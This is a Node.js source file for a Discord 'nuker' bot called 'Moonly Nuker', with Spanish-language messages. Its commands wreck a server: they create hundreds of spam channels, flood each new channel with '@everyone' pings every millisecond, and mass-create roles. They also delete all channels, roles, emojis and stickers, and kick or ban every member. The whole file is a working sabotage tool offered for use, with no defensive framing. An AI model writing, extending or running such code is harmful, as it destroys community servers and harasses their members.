process.title = "Moonly Nuker | Moonlygg.com | discord.gg/moonlygg";

const { Client, Intents, MessageEmbed, Guild, GuildPreview, InviteGuild } = require("discord.js");
const nuker = new Client({ intents: Object.values(Intents.FLAGS).reduce((a, b) => a + b) });
const { red, greenBright, blue, white } = require("chalk");
const { token, prefix, userID, disableEveryone } = require("./config.json")


nuker.on("ready", () => {
    console.clear();
    console.log(blue(String.raw`
                         __  __                   _         ____                  _   
                        |  \/  | ___   ___  _ __ | |_   _  | __ )  ___   ___  ___| |_ 
                        | |\/| |/ _ \ / _ \| '_ \| | | | | |  _ \ / _ \ / _ \/ __| __|
                        | |  | | (_) | (_) | | | | | |_| | | |_) | (_) | (_) \__ \ |_ 
                        |_|  |_|\___/ \___/|_| |_|_|\__, | |____/ \___/ \___/|___/\__|
                                                    |___/                             
    `));

    console.log(white(`
Autor     : swiftdeskk
GitHub    : github.com/swiftdeskk
Web       : Moonlygg.com
Prefijo   : ${prefix}
    `));

    nuker.user.setActivity({ name: ".gg/moonlygg", type: "PLAYING" });
});

nuker.on("messageCreate", (message) => {

    const help = new MessageEmbed()
        .setDescription(`
    \n**Crear múltiples canales**
    ${prefix}mc [cantidad] (nombre) ej: \`${prefix}mc 100 prueba\`\n
    **Crear canales y mencionar a todos**
    ${prefix}cp [cantidad] (nombre), {mensaje} ej: \`${prefix}cp 100 prueba, hola a todos\`\n
    **Crear múltiples roles**
    ${prefix}mr [cantidad] (nombre) ej: \`${prefix}mr 100 rol\`\n
    **Eliminar todos los canales**
    ${prefix}dc\n
    **Eliminar todos los roles**
    ${prefix}dr\n
    **Eliminar todos los emojis**
    ${prefix}de\n
    **Eliminar todos los stickers**
    ${prefix}ds\n
    **Expulsar a todos los miembros**
    ${prefix}mk\n
    **Banear a todos los miembros**
    ${prefix}mb
    `)

        .setColor(0x6c02ff);

    const channelPerms = message.guild.members.me.permissions.has(["MANAGE_CHANNELS", "ADMINISTRATOR"]);
    const banPerms = message.guild.members.me.permissions.has(["BAN_MEMBERS", "ADMINISTRATOR"]);
    const kickPerms = message.guild.members.me.permissions.has(["KICK_MEMBERS", "ADMINISTRATOR"]);
    const rolePerms = message.guild.members.me.permissions.has(["MANAGE_ROLES", "ADMINISTRATOR"]);
    const emotePerms = message.guild.members.me.permissions.has(["MANAGE_EMOJIS_AND_STICKERS", "ADMINISTRATOR"]);


    let args = message.content.split(" ").slice(1);
    var args1 = args[0];
    var args2 = args.slice(1).join(' ')
    var args3 = args.slice(2).join(', ');

    if (!disableEveryone) {

        if (message.content.startsWith(prefix + "help")) {
            message.channel.send({embeds: [help]})
        }

        if (message.content.startsWith(prefix + "mc")) {
            MassChannels(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "dc")) {
            DelAllChannels().catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "cp")) {
            MassChnPing(args1, args2, args3).catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "mr")) {
            MassRoles(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "dr")) {
            DelAllRoles().catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "ds")) {
            DelAllStickers().catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "de")) {
            DelAllEmotes().catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "mb")) {
            BanAll().catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "mk")) {
            KickAll().catch((err) => {
                message.reply(err);
            });
        }
    } else {

        if (message.content.startsWith(prefix + "help")) {
            if (message.author.id != userID) return message.reply("No estás autorizado para usar los comandos de esta herramienta.");
            message.channel.send({embeds: [help]})
        }

        if (message.content.startsWith(prefix + "mc")) {
            if (message.author.id != userID) return message.reply("No estás autorizado para usar los comandos de esta herramienta.");
            MassChannels(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "dc")) {
            if (message.author.id != userID) return message.reply("No estás autorizado para usar los comandos de esta herramienta.");
            DelAllChannels().catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "cp")) {
            if (message.author.id != userID) return message.reply("No estás autorizado para usar los comandos de esta herramienta.");
            MassChnPing(args1, args2, args3).catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "mr")) {
            if (message.author.id != userID) return message.reply("No estás autorizado para usar los comandos de esta herramienta.");
            MassRoles(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "dr")) {
            if (message.author.id != userID) return message.reply("No estás autorizado para usar los comandos de esta herramienta.");
            DelAllRoles().catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "ds")) {
            if (message.author.id != userID) return message.reply("No estás autorizado para usar los comandos de esta herramienta.");
            DelAllStickers().catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "de")) {
            if (message.author.id != userID) return message.reply("No estás autorizado para usar los comandos de esta herramienta.");
            DelAllEmotes().catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "mb")) {
            if (message.author.id != userID) return message.reply("No estás autorizado para usar los comandos de esta herramienta.");
            BanAll().catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "mk")) {
            if (message.author.id != userID) return message.reply("No estás autorizado para usar los comandos de esta herramienta.");
            KickAll().catch((err) => {
                message.reply(err);
            });
        }
    }

    function MassChannels(amount, channelName) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("Argumentos no especificados: indica la cantidad de canales que deseas crear.");
            if (isNaN(amount)) return reject("Error de tipo: usa un número para la cantidad.");
            if (amount > 500) return reject("Error de cantidad: el máximo permitido por servidor es 500. Usa un número menor.");
            if (!channelPerms) return reject("Permisos insuficientes: el bot necesita 'MANAGE_CHANNELS'.");
            for (let i = 0; i < amount; i++) {
                if (message.guild.channels.cache.size === 500) break;
                if (!channelName) {
                    message.guild.channels.create(`${message.author.username} estuvo aquí`, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Se encontró un error: " + err)) })
                } else {
                    message.guild.channels.create(channelName, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Se encontró un error: " + err)) })
                }
            }
            resolve();
        });
    }

    function MassChnPing(amount, channelName, pingMessage) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("Argumentos no especificados: indica la cantidad de canales que deseas crear.");
            if (isNaN(amount)) return reject("Error de tipo: utiliza un número válido para la cantidad.");
            if (amount > 500) return reject("Error de cantidad: el máximo de canales por servidor es 500. Usa un número menor.");
            if (!channelPerms) return reject("Permisos insuficientes: el bot necesita 'MANAGE_CHANNELS'.");
            if (!pingMessage) return reject("Argumentos no especificados: escribe el mensaje que deseas mencionar masivamente.");

            for (let i = 0; i < amount; i++) {
                if (message.guild.channels.cache.size === 500) break;
                if (!channelName) {
                    message.guild.channels.create(`${message.author.username} estuvo aquí`, { type: "GUILD_TEXT" })
                        .catch((err) => { console.log(red("Se encontró un error: " + err)) })
                        .then((ch) => {
                            setInterval(() => {
                                ch.send("@everyone " + pingMessage);
                            }, 1);
                        });
                } else {
                    message.guild.channels.create(channelName, { type: "GUILD_TEXT" })
                        .catch((err) => { console.log(red("Se encontró un error: " + err)) })
                        .then((ch) => {
                            setInterval(() => {
                                ch.send("@everyone " + pingMessage);
                            }, 1);
                        });
                }
            }
            resolve();
        });
    }



    function DelAllChannels() {
        return new Promise((resolve, reject) => {
            if (!channelPerms) return reject("Permisos insuficientes: el bot necesita 'MANAGE_CHANNELS'.");
            message.guild.channels.cache.forEach((ch) => ch.delete().catch((err) => { console.log(red("Se encontró un error: " + err)) }))
            resolve();
        });
    }

    function MassRoles(amount, roleName) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("Argumentos no especificados: indica la cantidad de roles que deseas crear.");
            if (isNaN(amount)) return reject("Error de tipo: utiliza un número para la cantidad.");
            if (!rolePerms) return reject("Permisos insuficientes: el bot necesita 'MANAGE_ROLES'.");
            for (let i = 0; i <= amount; i++) {
                if (message.guild.roles.cache.size === 250) break;
                if (!roleName) {
                    message.guild.roles.create({ name: "nuked", color: "RANDOM", position: i++ }).catch((err) => { console.log(red("Se encontró un error: " + err)) })
                } else {
                    message.guild.roles.create({ name: roleName, color: "RANDOM", position: i++ }).catch((err) => { console.log(red("Se encontró un error: " + err)) })
                }
            }
        })
    }

    function DelAllRoles() {
        return new Promise((resolve, reject) => {
            if (!rolePerms) return reject("Permisos insuficientes: el bot necesita 'MANAGE_ROLES'.");
            message.guild.roles.cache.forEach((r) => r.delete().catch((err) => { console.log(red("Se encontró un error: " + err)) }))
        });
    }

    function DelAllEmotes() {
        return new Promise((resolve, reject) => {
            if (!emotePerms) return reject("Permisos insuficientes: el bot necesita 'MANAGE_EMOJIS_AND_STICKERS'.");
            message.guild.emojis.cache.forEach((e) => e.delete().catch((err) => { console.log(red("Se encontró un error: " + err)) }))
        });
    }

    function DelAllStickers() {
        return new Promise((resolve, reject) => {
            if (!emotePerms) return reject("Permisos insuficientes: el bot necesita 'MANAGE_EMOJIS_AND_STICKERS'.");
            message.guild.stickers.cache.forEach((s) => s.delete().catch((err) => { console.log(red("Se encontró un error: " + err)) }))
        });
    }

    function BanAll() {
        return new Promise((resolve, reject) => {
            if (!banPerms) return reject("Permisos insuficientes: el bot necesita 'BAN_MEMBERS'.");
            let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
            message.reply("Se encontraron " + arrayOfIDs.length + " usuarios.").then((msg) => {
                setTimeout(() => {
                    msg.edit("Baneando...");
                    for (let i = 0; i < arrayOfIDs.length; i++) {
                        const user = arrayOfIDs[i];
                        const member = message.guild.members.cache.get(user);
                        member.ban().catch((err) => { console.log(red("Se encontró un error: " + err)) }).then(() => { console.log(greenBright(`${member.user.tag} fue baneado.`)) });
                    }
                }, 2000);
            })
        })
    }

    function KickAll() {
        return new Promise((resolve, reject) => {
            if (!kickPerms) return reject("Permisos insuficientes: el bot necesita 'KICK_MEMBERS'.");
            let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
            message.reply("Se encontraron " + arrayOfIDs.length + " usuarios.").then((msg) => {
                setTimeout(() => {
                    msg.edit("Expulsando...");
                    for (let i = 0; i < arrayOfIDs.length; i++) {
                        const user = arrayOfIDs[i];
                        const member = message.guild.members.cache.get(user);
                        member.kick().catch((err) => { console.log(red("Se encontró un error: " + err)) }).then(() => { console.log(greenBright(`${member.user.tag} fue expulsado.`)) });
                    }
                }, 2000);
            })
        })
    }
});

nuker.login(token).catch((err) => {
    if (err.message.includes("An invalid token was provided")) {
        console.log(red("❌ Token inválido. Verifica tu archivo config.json."));
    } else {
        console.error(err);
    }
});